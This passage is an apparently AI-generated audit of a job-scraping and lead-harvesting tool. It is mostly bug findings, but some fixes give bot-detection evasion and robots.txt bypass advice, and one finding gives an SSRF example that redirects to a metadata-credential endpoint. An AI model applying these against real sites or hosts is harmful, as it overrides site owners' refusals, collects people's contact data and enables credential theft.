# HarvestKit audit — 2026-09-21

Produced by a 12-subsystem parallel audit with adversarial verification.

301 distinct findings after dedupe (301 raw). 67 went through a refutation pass before the run hit its token limit; the rest are unverified and should be confirmed before acting.

Severity is the auditing agent's own rating.

## Status, 2026-09-22

**All 54 criticals are now addressed**, plus the highs that shared a root cause
with one. See CHANGELOG.md `[Unreleased]` for what each fix actually does and
what was measured before and after; the entries below are kept verbatim as the
record of what was found, not as a to-do list.

Verified live rather than by inspection: the transport ladder escalating across
four worker threads without `greenlet.error`, the browser rung returning `None`
for a dead host, SmartRecruiters going from 23 to 1,653 listings on one keyword,
`tools/doctor.py` reading 8/8 European sites, and the control panel running a
real job end to end.

The **~110 medium and low findings below have not been individually
re-verified.** The audit hit its token limit with 299 of 383 verification agents
unrun, so severities on anything not marked verified are the finding agent's own
rating and should be confirmed before acting on them.

**54 critical · 103 high · 113 medium · 31 low**


## CRITICAL

### The RUNBOOK's mandatory smoke run makes zero network requests and can never fail for the reasons it claims to catch

`docs/RUNBOOK-leads.md:29` · docs-mismatch

**What happens.** RUNBOOK-leads.md:29-42 says "Always do this first. It costs almost nothing and catches a dead seed API, a broken config or an empty funnel before the long run," then gives a command that passes only `--config configs/leads/eu-it.yaml --target 10 --max-pages 3 --max-person-pages 2 --no-smtp`. eu-it.yaml:49 is `targets: []` (the Arbeitsagentur targets were removed), and the command passes none of `--boards`, `--jobsch-pages`, `--arbeitnow-pages` or `--search-keywords`. In src/leadgen/cli.py:292-350 every seeding branch is gated on one of those, so `listings` stays empty, `companies_from_listings` gets nothing, and `process_companies` is handed an empty list. Line 40 then instructs "Read the `seed:` lines. If every target reports `0 listings`, stop" — cli.py:80 only emits a `seed:` line inside the per-target loop, so with zero targets there are no seed lines at all. The operator's one sanity gate before a 1-4 hour run validates nothing.

**Failure.** I ran the documented command verbatim (output redirected to scratch). It completed instantly with zero HTTP requests: `seed: 0 listings total / seed: 0 unique companies with a resolved own-domain / funnel: {} / requested 10 candidates 0 selected 0 / SHORTFALL 10 / wrote 0 rows`, exit 2. An operator on a fully bot-walled network and an operator on a perfect network get byte-identical output from this step.

**Fix.** The smoke command must carry a seed. For Europe it needs `--search-keywords configs/leads/keywords.txt --countries eu --search-max-pages 1`; for CH it needs `--jobsch-pages 2 --countries CH`. Separately, cli.py should exit non-zero with an explicit message when a run finishes with zero seed listings AND zero configured seed sources, rather than reporting an ordinary SHORTFALL.

### The runbook's pre-flight health check calls a 403 a pass, which is the exact status that guarantees the run yields nothing

`docs/RUNBOOK-leads.md:25` · anti-bot

**What happens.** Lines 19-27 tell the operator to curl six company domains and then state: "Anything other than `000` is fine — 301, 403 and 429 all mean the host is reachable. Several `000` results mean egress is filtered." For this pipeline a 403 is not "reachable," it is total loss. src/job_scraper/http.py:576-579 returns `None` on a 403 with no retry, no backoff and no log line above DEBUG. src/job_scraper/robots.py:66-69 turns a 403 on /robots.txt into `parser.disallow_all = True`, which blanks the entire host before a single page is requested. 429 is likewise a pass in the check but http.py:571-575 also returns None. Four of the six domains the runbook itself names (sap.com, hellofresh.de, getyourguide.com, zalando.de) answer 403 to a plain request.

**Failure.** An operator runs the health check on a machine where every EU company domain serves a bot wall. Four of six print 403, two print 200, none print 000. The runbook says this is fine. They then spend four hours on a run in which every one of those employers is silently discarded, and the funnel reports them as `no_person_found`.

**Fix.** The check must assert on body content, not reachability: count a host as healthy only if it returns 2xx AND the body is not a challenge (reuse `transport.classify`). State plainly that a 403 in this check predicts zero leads from that domain and is the signal to configure a transport that can pass it.

### A killed MV3 service worker destroys the whole crawl queue; the keepalive alarm actively disarms itself on restart and nothing resumes

`extension/app/src/background/keepalive.ts:45` · correctness

**What happens.** The entire crawl state — the per-host queues inside runHostScheduled, the PENDING tab registry, the in-flight counters — lives only in service-worker module memory. Nothing is persisted except the run row and the failure log. keepalive.ts is a 20s getPlatformInfo() ping plus a 30s alarm. If the worker dies anyway (crash, extension update, browser memory pressure, machine sleep, a Chrome build that does not honour the API-call idle reset), the alarm fires on the fresh worker, activeHolds is 0 in the new module scope, and the onAlarm handler calls stop() — which CLEARS the alarm. Nothing re-reads db.runs for rows still marked 'running', so the remaining URLs are dropped permanently, the run stays 'running' forever, and Runs.tsx:44 renders it as live indefinitely. There is no chrome.runtime.onStartup handler and no stuck-run reconciliation anywhere (`grep -rn 'onStartup|status === "running"' app/src/background/` returns nothing).

**Failure.** A 900-URL deep crawl is 400 URLs in when the laptop lid closes. On wake, the worker restarts, the alarm fires once, activeHolds===0, stop() clears the alarm. The remaining 500 URLs are never fetched, the run row is stuck at status='running' done=400, and the Runs view shows a permanently spinning job.

**Fix.** Persist the pending URL list per run (a db.runs.queue column or a queue table) and drain it from a chrome.runtime.onStartup + onAlarm handler: on wake, load every run with status 'running', re-enqueue its unfinished URLs and re-hold the keepalive. Also mark runs whose started_at is older than a threshold with no progress as 'failed' rather than leaving them 'running'.

### "Scrape ALL pages" pipeline never paginates — maxPages:100 is sent but never read

`extension/app/src/background/main.ts:160` · silent-failure

**What happens.** Dashboard.tsx:160 sends FULL_SCRAPE_ACTIVE with `maxPages: 100` and toasts "Starting full pipeline: paginate -> collect -> deep-scrape". The FULL_SCRAPE_ACTIVE handler in main.ts sends exactly one EXTRACT_LIST to the active tab and never reads msg.maxPages. `grep -rn maxPages app/src/background/` returns nothing. The content script DOES implement an AUTO_PAGINATE handler (inject.tsx:233) but `grep -rn AUTO_PAGINATE app/src/` shows it has no sender anywhere in the codebase — the pagination feature is wired on the receiving end only.

**Failure.** Operator opens stepstone.de with 900 results across 36 pages, clicks the flagship "scrape everything" button, sees the 'paginate -> collect -> deep-scrape' toast, and gets 25 leads — page one only. The other 875 are silently never requested.

**Fix.** In the FULL_SCRAPE_ACTIVE handler, replace the single EXTRACT_LIST with a sendMessage of {type:'AUTO_PAGINATE', maxPages: msg.maxPages, delayMs: msg.delayMs} and use the returned `cards`, falling back to EXTRACT_LIST when the content script does not answer.

### FULL_SCRAPE reports "deep-scraped N/N" before a single page has been fetched

`extension/app/src/background/main.ts:203` · silent-failure

**What happens.** startCrawlRun() inserts the run row and returns the run id immediately — the actual crawl is launched as `void withKeepalive(() => runCrawl(...))` (bulk.ts:136) and is deliberately NOT awaited. main.ts sets `deepScraped = urls.length` on the very next line and reports it as a completed count, so the success toast is emitted before any tab has been opened. If every single deep scrape subsequently 403s, times out or returns no content, the user has already been told the run succeeded.

**Failure.** 25 cards found on a bot-walled EU site. Every deep visit returns a consent/403 shell so extract() yields no job. UI says "Done! 25 jobs found, 25/25 deep-scraped." while db.runs shows ok=0 failed=25. The operator believes the scraper is working and never investigates the IP block.

**Fix.** Return only the runId from FULL_SCRAPE_ACTIVE and have the Dashboard navigate to the Runs view and watch db.runs live (it already does this for CRAWL_URLS). Never report a completion count for work that has not been awaited.

### Extension and Python CLI compute DIFFERENT fingerprints for the same URL — the "one shared id" contract is broken for European URLs

`extension/app/src/lib/canonicalUrl.ts:29` · correctness

**What happens.** canonicalizeUrl() uses the WHATWG `new URL()` parser, which normalises aggressively: it punycodes IDN hosts, percent-encodes non-ASCII path bytes, drops default ports, resolves dot-segments, and re-serialises the query with the x-www-form-urlencoded rules. Python's canonicalize_url() (src/job_scraper/models.py:44) uses urlparse/urlunparse, which does NONE of that — it preserves the raw string. The fingerprint is sha1 over that canonical URL, so any of those normalisations produces a different `id`. Both halves write into the same `id` column, so the same posting scraped by the CLI and by the extension lands as two rows. I verified this empirically against the real Python module: 7 of 16 realistic URL shapes diverge. Also note the `new URL()` throw path returns the raw string un-stripped, so a RELATIVE apply_url keeps its utm_source in the extension while Python strips it.

**Failure.** CLI scrapes https://www.example.de/stellen/bürokauffrau-münchen and writes id=sha1('https://www.example.de/stellen/bürokauffrau-münchen | ...'). The extension scrapes the same page and writes id=sha1('https://www.example.de/stellen/b%c3%bcrokauffrau-m%c3%bcnchen | ...'). Two rows, no dedupe. German/French/Nordic job boards use umlauts and accents in path slugs constantly, so this fires on a large fraction of EU postings.

**Fix.** Pick ONE canonical form and make both sides produce it. Easiest correct fix: in canonicalUrl.ts do not use `new URL().toString()` as the output — reassemble from the parsed parts using the ORIGINAL host and path substrings (or, better, change the Python side to normalise via a WHATWG-compatible library such as `urllib.parse` + `idna` + explicit percent-encoding so both converge). Add a shared golden-vector fixture (the 16 cases above) asserted in BOTH pytest and node --test so the two implementations can never drift again.

### daily.ps1 and setup.ps1 abort on the first log line under Windows PowerShell 5.1 — the shell employees actually have

`scripts/daily.ps1:164` · correctness

**What happens.** Both scripts set `$ErrorActionPreference = "Stop"` (daily.ps1:77, setup.ps1:21) and then run the Python entry point with native-stderr redirection into a pipeline: daily.ps1:164 `& $python @leadArgs 2>&1 | Tee-Object -FilePath $logFile` and setup.ps1:88 `& $python @smokeArgs 2>&1 | Where-Object {...}`. src/leadgen/cli.py:262-266 configures `logging.basicConfig`, whose default stream is stderr, so every single INFO line the run emits is stderr. Under Windows PowerShell 5.1 (`powershell.exe`, still the default shell on a stock Windows box), `2>&1` on a native command converts stderr lines into ErrorRecords, and `$ErrorActionPreference = 'Stop'` makes the first one a terminating NativeCommandError.

**Failure.** I reproduced it. A script that sets $ErrorActionPreference='Stop' and runs `& python -c "sys.stderr.write('log line'); sys.exit(2)" 2>&1 | Tee-Object` behaves as follows: under pwsh 7.6 it prints the line and reaches the end with LASTEXITCODE=2; under powershell.exe 5.1 it emits `NativeCommandError ... + FullyQualifiedErrorId : NativeCommandError` and the script terminates with exit 1. So on 5.1 daily.ps1 dies at the very first `seed:` line — no CSV, no verification, no "DO NOT SEND" message, exit 1 instead of the documented 0/2/3. docs/ONBOARDING.md:36 and :77 tell the employee to run exactly these scripts in "PowerShell" with no version qualification.

**Fix.** Either drop the `2>&1` and let stderr flow to the console while Tee-ing only stdout, or wrap the native call: `$prev = $ErrorActionPreference; $ErrorActionPreference = 'Continue'; & $python @leadArgs 2>&1 | Tee-Object ...; $ErrorActionPreference = $prev`. Also pin the requirement (`#Requires -Version 7`) or tell ONBOARDING readers to install and use pwsh.

### AshbyAdapter returns zero jobs for every board when obey_robots is true (api.ashbyhq.com robots.txt answers 401 -> RFC 9309 disallow-all)

`src/job_scraper/adapters/ashby.py:27` · silent-failure

**What happens.** ashby.py:27 hits https://api.ashbyhq.com/posting-api/job-board/{slug}. Every HttpClient.get is gated by _robots_allow (http.py:502). robots.py:66-69 treats an HTTP 401/403 on robots.txt as 'the whole host is off-limits' and sets parser.disallow_all=True. api.ashbyhq.com/robots.txt returns 401, so can_fetch() is False for every Ashby API URL, get() returns None before any request, and fetch_jobs returns []. Both shipped lead configs set obey_robots: true (configs/leads/eu-it.yaml:42, configs/leads/swiss-it.yaml:15) and the code default is True (config.py:39). jobs.ashbyhq.com/robots.txt is permissive, so this is not a site-wide refusal, only the API host 401ing an unauthenticated robots.txt GET.

**Failure.** Any Ashby board target in a lead run with the shipped configs yields 0 listings and a single INFO line 'ashby: no payload for tractable', which reads as 'the board is empty'. Every Ashby-hosted EU employer contributes nothing.

**Fix.** Add api.ashbyhq.com to robots_exempt_hosts for ATS adapters, or scope robots.py's 401/403 -> disallow_all rule so it does not apply to documented public read-only API hosts. Separately, propagate 'blocked by robots' back to the adapter so the log says that rather than 'no payload'.

### finn.no `published=30` returns HTTP 404 — three shipped configs harvest zero jobs

`src/job_scraper/adapters/finn.py:7` · correctness

**What happens.** The adapter docstring advertises `published=<days>` as a free integer and three shipped configs pass `published=30`. finn.no only accepts a small enumerated set; anything above 7 is a 404. `http.get` maps 404 to `None` with a `logging.debug` line, so the adapter breaks on page 1 and returns [] with only a bland INFO message.

**Failure.** Running `--config norway-it` (or norway-big, or norway-top5) harvests 0 finn.no postings. finn.no is Norway's largest job marketplace and is target #1 in all three configs. Affected lines: configs/regions/norway-big.yaml:23, configs/regions/norway-it.yaml:110, configs/regions/norway-top5.yaml:50.

**Fix.** Clamp `published` to the accepted set {0,1,2,3,7} in the adapter (and drop it rather than 404 when a larger window is asked for), fix the three configs to `published=7`, and make a 4xx on page 1 a WARNING that names the status code rather than a debug-level `None`.

### nav.no ignores ?page= — every NAV target returns exactly 25 ads and stops

`src/job_scraper/adapters/nav.py:49` · correctness

**What happens.** NavNoAdapter paginates with `page_params.append(("page", str(page)))`. arbeidsplassen.nav.no no longer honours `page` — it silently drops it and re-serves the first 25 results. The adapter's `if new == 0: break` (nav.py:70) then reads that as "no more results" and exits after page 2, so max_pages is inert. The site paginates on `from=<offset>` instead.

**Failure.** `configs/regions/norway-it.yaml` declares three NAV targets (q=utvikler, q=engineer, q=developer, lines 113-119). Each returns 25 rows instead of walking the full result set, so NAV contributes at most 75 postings per run for all of Norway — against 214 available for the single query `utvikler` alone. The run log says "nav.no: 25 listings" and nothing else; there is no error to notice.

**Fix.** Paginate with `from=(page-1)*25` instead of `page=N` (verified live: from=0/25/50/75/100 each yield 25 disjoint ads). Better: switch to the JSON endpoint https://arbeidsplassen.nav.no/stillinger/api/search, which returns `hits.total.value` and `hits.hits[]._source` (uuid, title, employer, businessName, published, expires, locationList, occupationList) — that gives an authoritative total to paginate against and removes the regex-over-HTML dependency entirely.

### SmartRecruitersAdapter returns zero jobs for every company when obey_robots is true, and logs nothing at all

`src/job_scraper/adapters/smartrecruiters.py:29` · silent-failure

**What happens.** api.smartrecruiters.com/robots.txt is 'User-agent: LinkedInBot / Allow: /v1/companies/ ; User-agent: * / Disallow: /'. The client sends its own UA, matches the '*' group, and is disallowed for every path. _has_postings (line 69-74) and the paging loop (line 27-43) both return nothing. Worse, the only log line in the adapter is guarded by `if listings:` (line 44-45), so a total loss produces zero output.

**Failure.** A run seeded with SmartRecruiters employers (Bosch Group alone has 4801 open roles) collects 0 of them and prints nothing, so the operator concludes SmartRecruiters companies are not hiring.

**Fix.** Exempt api.smartrecruiters.com explicitly (or obtain a UA/agreement SmartRecruiters permits), and move the logging.info out of the `if listings:` guard so a zero result is always reported with its cause.

### PlaywrightFetcher.get() returns an empty page instead of None when navigation fails, poisoning the HTTP cache for 24 h

`src/job_scraper/crawl.py:150` · silent-failure

**What happens.** `page.goto(...)` is wrapped in `with suppress(Exception)`, so a DNS failure, TLS error, timeout or connection reset is swallowed and execution continues to `return page.url, page.content()` — which for a failed navigation is `('chrome-error://chromewebdata/', '<html><head></head><body></body></html>')`, a truthy tuple. Callers treat non-None as success. `main.py:117-122` then does `cache.put(target.url, pw_final, pw_html)`, writing that empty body into the shared SQLite HTTP cache keyed on the *target URL*. `_ResponseCache.get` re-checks `_looks_like_block` on read, but that empty document passes the filter, so the poisoned entry is served for the whole `cache_ttl_seconds` (default 86400).

**Failure.** A target with `use_playwright: true` is pre-rendered while the machine has a 3-second network blip. The empty page is cached under the target URL. For the next 24 hours every run — including runs on a healthy network — reads the empty document from cache, the adapter finds zero jobs, and the operator sees "0 jobs" with no error anywhere. Purging requires deleting `.cache/http_cache.sqlite` by hand.

**Fix.** Capture the return of `page.goto` and return None when it is None or `response.ok` is false; treat `page.url` starting with `chrome-error://` or `about:blank`, or a body under ~500 bytes, as a failure. Never cache a Playwright result whose navigation did not succeed. Add the empty-skeleton shape to `_looks_like_block` as a second line of defence.

### PlaywrightFetcher never receives a proxy — the entire browser path egresses from the operator's real IP

`src/job_scraper/crawl.py:122` · anti-bot

**What happens.** `chromium.launch(headless=self.headless)` and `browser.new_context(...)` are called with no `proxy=` argument, and `PlaywrightFetcher.__init__` takes no proxy parameter at all. The `_ProxyPool` in `http.py` is wired only into `HttpClient`. So every page the browser loads — listing pre-renders in `main.py`, JS re-fetches in `deep_scrape.py`, every general-scraper fetch — goes out over the machine's own IP even when `run.proxies` is fully populated. Worse, the browser also carries a persistent cookie jar across all those requests, so the real IP is tied to one long-lived session.

**Failure.** An operator configures `run.proxies` to get around the 403 walls on www.hellofresh.de / www.getyourguide.com and sets `use_playwright: true` because those sites are JS-heavy. Every HTTP fetch rotates through proxies while every browser fetch comes from the employee's home IP — which then gets rate-limited or blocked outright, and the block follows the employee rather than a disposable proxy.

**Fix.** Add `proxy` to `PlaywrightFetcher.__init__` and pass `{'server': url, 'username':..., 'password':...}` to `chromium.launch` (or per-context for rotation). Take an entry from the same `_ProxyPool` the `HttpClient` uses so health tracking and cooldowns are shared, and create a fresh context per proxy so cookies do not leak across egress IPs.

### Headless Playwright is trivially fingerprinted: userAgentData reports "HeadlessChrome/145" while the spoofed UA string claims Chrome/120

`src/job_scraper/crawl.py:124` · anti-bot

**What happens.** `new_context` overrides only the `User-Agent` *string*. Chromium still reports the real, headless brand list through `navigator.userAgentData` and the matching `Sec-CH-UA` request headers, so every request carries a self-contradicting identity. On top of that none of the standard headless tells are patched. I enumerated them live against the shipped context.

**Failure.** Cloudflare/DataDome/Akamai compare `Sec-CH-UA` against the UA string on the very first request to www.zalando.de or www.getyourguide.com. The mismatch (HeadlessChrome/145 vs Chrome/120) plus `navigator.webdriver` plus a SwiftShader renderer plus zero plugins plus zero image requests scores as a bot on every vendor's default ruleset — the browser path is blocked as reliably as the plain `requests` path, so switching on `use_playwright` does not fix the 403s.

**Fix.** Launch with `args=['--disable-blink-features=AutomationControlled']`, drop the UA override in favour of a real (non-headless-branded) channel — `channel='chrome'` with `headless=False` under a virtual display, or the new `--headless=new` mode — and patch the remaining surface via `context.add_init_script` (webdriver, window.chrome, plugins, permissions, WebGL vendor/renderer). Set `locale`/`timezone_id`/`geolocation` consistently with the proxy's country and make `Accept-Language` match `navigator.languages`. Stop aborting images wholesale, or at least let a sample through. Consider an off-the-shelf hardened driver (patchright / rebrowser-playwright / camoufox) rather than hand-rolling.

### Every Playwright call from a deep-scrape worker thread raises greenlet.error and is swallowed at DEBUG — `use_playwright` is dead for enrichment

`src/job_scraper/deep_scrape.py:41` · silent-failure

**What happens.** `_playwright_get` claims to be a "thread-safe wrapper" and serialises access with a module-level lock. A lock does not help: Playwright's sync API is bound to the *greenlet of the thread that created it*, so calling `fetcher.get()` from any other thread raises `greenlet.error: Cannot switch to a different thread`, regardless of mutual exclusion. Both call sites wrap the call in `except Exception` and log at DEBUG (line 163) or fold it into `last_err` (line 227), so at the default INFO level the operator sees nothing at all. `deep_scrape_jobs` always runs `_scrape_one` inside a `ThreadPoolExecutor`, so 100% of Playwright re-fetches and escalations fail.

**Failure.** `configs/regions/norway-top5.yaml` sets `run.use_playwright: true`, `deep_concurrency: 12`, and lists karrierestart.no as a target. karrierestart.no is in `DEFAULT_PLAYWRIGHT_HOSTS`, so `needs_js` is true for every one of its detail pages — the entire reason Playwright is enabled is to reach its JS-rendered contact block. Every one of those re-fetches raises greenlet.error inside a worker, is logged at DEBUG, and the run silently falls back to the un-rendered HTML with no recruiter name/phone/email. The run reports "ok-universal" for those listings.

**Fix.** Playwright sync objects cannot cross threads. Either (a) give each worker thread its own `sync_playwright()` context (thread-local fetcher), or (b) run one dedicated Playwright thread that owns the fetcher and hand it work over a `queue.Queue` with futures, or (c) move to `playwright.async_api` on its own event loop. Also raise the swallowed logging to WARNING so a 100%-failure mode cannot be invisible.

### One listing's unexpected exception aborts the whole deep-scrape batch and the entire run, discarding every job already scraped

`src/job_scraper/deep_scrape.py:240` · correctness

**What happens.** `fut.result()` is called bare inside the `as_completed` loop. `_scrape_one` only guards the Playwright calls and the LLM call; `http.get`, `extract_job_from_page`, `universal_extract`, `mine_contacts` and `listing.merge` are all unguarded. Any exception those raise (or that `http.get` lets through — it only catches `requests.RequestException`, so a `sqlite3.OperationalError` from the cache write, a `UnicodeDecodeError`, or a parser bug propagates) re-raises out of `deep_scrape_jobs`. In `main.py` the call at line 137 is not wrapped in `try/except` — the enclosing `try` at line 105 has only a `finally` — so it propagates out of `main()`. Filtering, dedupe and `run_exports` all happen *after* the loop (lines 151-160), so nothing is written: a 6-hour run over 400 targets is lost at target 399.

**Failure.** Two HarvestKit runs share `.cache/http_cache.sqlite` (the documented deployment: several employees / several configs). The second writer gets `sqlite3.OperationalError: database is locked` from `_ResponseCache.put`, which is not a `RequestException`, so `http.get` does not catch it. One listing out of 5,000 kills the process with a bare traceback and zero rows exported.

**Fix.** Wrap the body of `_scrape_one` in `try/except Exception` returning `(False, f"error:{exc}")`, and additionally wrap `fut.result()` in try/except so a future that still raises is counted as failed rather than aborting `as_completed`. Separately, wrap the `deep_scrape_jobs` call in `main.py` per target, and write partial results (checkpoint) so a crash never discards completed work.

### SALARY_RX only matches currency-BEFORE-amount, so the dominant European form "45.000 EUR" never parses

`src/job_scraper/extract.py:1085` · data-quality

**What happens.** SALARY_RX is anchored on a mandatory leading currency token: `(?:€|EUR|USD|...|CHF|...)\s?(NUM)...`. There is no alternative branch for a trailing currency. In German, Italian, French, Dutch and all Nordic locales the currency follows the amount ("45.000 - 60.000 EUR", "30.000€", "650 000 kr", "95 000 SEK", "4.500 EUR/Monat"). Additionally "kr" (NO/DK/SE) is not in the currency alternation at all. Consequence: salary_min/salary_max/salary_currency stay empty on the majority of EU postings, and since salary_min/salary_max are in models._FIRST_WINS_FIELDS the blank never gets filled later either.

**Failure.** A HelloFresh/Zalando/SAP German posting says "Wir bieten ein Jahresgehalt von 60.000 - 75.000 EUR". SALARY_RX.search returns None, salary_min/salary_max/salary_currency are exported empty. Every downstream salary filter and every salary column in the CSV is blank for German/Italian/French/Nordic rows.

**Fix.** Add a symmetric postfix branch: `(NUM)\s?(?:-|–|bis|to)\s?(NUM)?\s?(CUR)` alternated with the existing prefix branch, and add `kr|NOK|SEK|DKK|zł|Kč|Ft|€` as trailing tokens. Extract the currency from whichever side matched.

### _NUM requires 2+ leading digits, so every 4-digit (monthly) salary is invisible

`src/job_scraper/extract.py:1084` · data-quality

**What happens.** `_NUM = r"\d{2,3}(?:[.,'\s ]\d{3})*(?:[.,]\d+)?"` forces the first digit group to be 2 or 3 digits. Any amount whose first group is a single digit — i.e. every value from 1'000 to 9'999 written with a thousands separator — cannot match. Swiss and German monthly salaries (CHF 8'500/Monat, EUR 4.500 pro Monat, EUR 2.500 - 3.500) and US-style $5,000 are all in that band.

**Failure.** A Swiss posting states "Wir bieten CHF 8'500 pro Monat". No salary is extracted at all. Note the neighbouring case CHF 12'000 works, so coverage is silently inconsistent by magnitude.

**Fix.** Change `\d{2,3}` to `\d{1,3}` in _NUM.

### Un-separated salaries are split into nonsense: "EUR 60000 - 80000" becomes salary_min=600, salary_max=00

`src/job_scraper/extract.py:1084` · correctness

**What happens.** _NUM's first group `\d{2,3}` is greedy but bounded at 3, and the group-separator part requires an explicit separator character. On a plain 5-digit number "60000" the first group consumes "600", the separator branch cannot continue (no '.'/','/space), the optional range dash matches empty, and group 2 `(NUM)?` then consumes "00". Both captures are fed straight to _normalize_amount and written to salary_min/salary_max. Because both fields are in models._FIRST_WINS_FIELDS, the garbage value permanently blocks any later correct parse.

**Failure.** A UK/IE posting says "GBP 45000". The CSV row exports salary_min=450, salary_max=00, salary_currency=GBP. A buyer filtering leads on salary >= 40000 drops the row; a buyer reading the column believes the job pays 450.

**Fix.** Anchor _NUM so an un-separated run of digits is taken whole: `(?:\d{1,3}(?:[.,'\s ]\d{3})+|\d{4,7})(?:[.,]\d{1,2})?`, and require an explicit range separator before group 2 rather than letting it match empty.

### German annual salaries are labelled "hour": the substring test `"hr" in p` matches "jahr"

`src/job_scraper/extract.py:1197` · correctness

**What happens.** The period classifier uses naive substring containment on the matched unit word: `elif "hour" in p or "hr" in p or ...`. The German word for year, "jahr", contains the substring "hr". Because the month branch is tested first and fails, control reaches the hour branch and matches. Every German-language annual salary is stamped salary_period='hour'.

**Failure.** A Berlin posting advertising EUR 60.000 pro Jahr exports salary_min=60000, salary_period=hour — i.e. a 60,000 EUR hourly rate. Any normalisation or comparison downstream (annualising an hourly figure) is off by ~2000x.

**Fix.** Match whole tokens instead of substrings, e.g. test the captured unit against explicit sets: {'hour','hr','stunde','heure','ora'} by equality/regex with anchors, and order year before hour.

### _apply_heuristics runs before _finalize populates the description, so its "scan the description, not the page" guard never fires on non-JSON-LD pages

`src/job_scraper/extract.py:1133` · data-quality

**What happens.** _apply_heuristics chooses its haystack with `if len(j.description) >= SELF_CONTAINED_DESCRIPTION_CHARS: text = j.description else: text = page_text + description`. But in extract_job_postings the call order is _apply_microdata -> _apply_opengraph -> _apply_heuristics (line 50/61) -> _finalize (line 52/63), and it is _finalize that scrapes the real description out of the DOM (line 1478). On any page without JSON-LD, j.description at heuristics time is only the og:description (or empty), so the guard is always false and the heuristics scan the entire page — including the 'similar jobs' sidebar and footer. The in-code comment claims this contamination was fixed; it is fixed only for the JSON-LD path.

**Failure.** Every job-board detail page that renders related-jobs cards (jobs.ch, StepStone, Indeed-style layouts) exports the neighbouring posting's tech stack, remote flag, seniority, email and phone on the current row. The exported contact belongs to a different employer, which is worse than an empty field for a lead product.

**Fix.** Move the description-resolution step (the DESCRIPTION_SELECTORS block of _finalize) ahead of _apply_heuristics, or have _apply_heuristics resolve its own haystack from the main/article node rather than soup.get_text().

### net_guard is bypassed entirely by a redirect: HttpClient follows 3xx with allow_redirects=True and never re-checks the hop

`src/job_scraper/http.py:530` · security

**What happens.** `guard(url)` at the four leadgen call sites checks only the URL the caller typed. `HttpClient.get` then calls `self._session.get(..., allow_redirects=True)`, and requests resolves and follows every 3xx hop itself - new DNS resolution, new connection - with no hook, no per-hop callback and no re-entry into net_guard. `head()` (line 587) does the same. So a URL that passes the guard because its host resolves publicly can 302 straight to http://169.254.169.254/latest/meta-data/iam/security-credentials/ and the body is returned to the caller as if it were the company's team page. Every URL fed to the guard is attacker-influenced by design (a scraped apply_url, a `<loc>` from somebody's sitemap, a `sameAs` from remote JSON-LD), so the attacker also controls the host that issues the redirect. This is the single-line defeat of the entire module.

**Failure.** A job ad on any ATS carries apply_url = https://attacker-controlled.example/careers. `domain.resolve_domain` or `cascade._harvest` calls `guard()`, which resolves attacker-controlled.example to a public IP and returns True. `http.get` follows the site's 302 to http://169.254.169.254/latest/meta-data/iam/security-credentials/role, requests fetches it from inside the VPS, and the JSON credential body is handed to `jsonld_person.extract` / `impressum.extract` and can be exfiltrated into the lead CSV's description or source_url fields. The runbook explicitly says to run this on a VPS where that endpoint is live.

**Fix.** Set `allow_redirects=False` in HttpClient and walk the redirect chain manually, calling `guard()` on every hop (and capping the chain), or install a `requests` transport adapter that re-resolves and validates each connection target. Same treatment for `head()` and for `PlaywrightFetcher.get` (crawl.py:145), which navigates with no guard at all.

### An exhausted proxy pool silently falls through to a direct connection, exposing the real IP; there is no fail-closed mode

`src/job_scraper/http.py:511` · security

**What happens.** `_ProxyPool.acquire()` returns None when every proxy is cooling down. `get()` stores that None in `proxy_entry`, `_proxies_dict(None)` returns None, and `self._session.get(..., proxies=None)` means "no per-request proxy" to requests — which then falls back to the session's (empty) proxies merged with environment variables, i.e. a direct connection. The code knows this (the docstring at line 156-159 says so verbatim) and responds with a single `logging.warning`, then proceeds anyway. There is no configuration switch to make the client refuse rather than de-anonymise, and the warning is emitted once per exhaustion event, so a run that is 100% direct after the first minute prints one line. Combined with the next finding (host-side blocks charged to proxy health), pool exhaustion is not an edge case — it is the steady state within seconds of a real EU run.

**Failure.** An employee's machine runs a lead harvest with 3 proxies. Nine 403s from WAF-protected EU domains (see next finding) cool the whole pool for 300s. For the following five minutes every request — thousands of them across thousands of company domains — goes out from the employee's real IP with a rotating fake Chrome UA. One WARNING line in the log is the only trace. The user's stated constraint ("I can't use my own device... we deploy this in our employees devices too") is violated by default.

**Fix.** Add a `proxy_required: bool` (default true whenever `proxies` is non-empty). When acquire() returns None and proxy_required is set, return None from get() with a distinct failure reason rather than issuing the request. Optionally block the calling thread until the soonest `dead_until`, since the pool self-heals. Never issue a request with proxies=None when a pool was configured; and set `session.trust_env = False` so an unrelated HTTP_PROXY env var cannot silently change egress.

### Host-side blocks (403 / 429 / WAF heuristic) are charged to proxy health, so one walled host burns the entire pool globally

`src/job_scraper/http.py:547` · anti-bot

**What happens.** `report_failure(proxy_entry)` is called on four paths that say nothing about the proxy's health: a transport exception (536-539), HTTP 429 (543), HTTP 403 (547), and a positive `_looks_like_block` result (560). 403 and 429 are properties of the (host, IP) pair — usually of the host's bot policy toward datacenter ranges — not of the proxy. `_ProxyPool` keeps a single global `failures` counter per proxy with no host dimension, so `max_failures` consecutive blocks from *any mix of hosts* marks the proxy dead for `cooldown_seconds` (300s default) across *all* hosts, including the many hosts it was working perfectly on. Because `acquire()` hands out proxies round-robin, a run crawling a sequence of WAF-protected domains distributes the blame evenly and kills every proxy at nearly the same moment.

**Failure.** Established fact 3: www.sap.com, www.hellofresh.de, www.getyourguide.com and www.zalando.de all return 403 to a plain request. A lead run with 10 proxies and max_failures=3 hits 30 such company domains — a few seconds of work — and every proxy is dead for 300s. The pool then yields None and every request goes direct (previous finding). Worse, the proxies were never faulty: they are cooled down for 5 minutes on evidence that says only "SAP blocks datacenter IPs".

**Fix.** Split the taxonomy. Transport failures (connect error, proxy CONNECT refused, TLS failure through the proxy, ContentDecodingError) -> proxy health. 403/429/block-heuristic -> a per-(proxy, host) blocklist plus a per-host backoff, never the global proxy counter. Key the failure counter on (proxy, host) so a proxy walled by sap.com stays available for the other 999 domains, and add a separate per-host "this host walls us" state that triggers escalation (different proxy class, or Playwright) rather than pool destruction.

### The "per-proxy cookie jar" does not isolate anything — requests.Session pools all cookies and replays them through every proxy

`src/job_scraper/http.py:532` · anti-bot

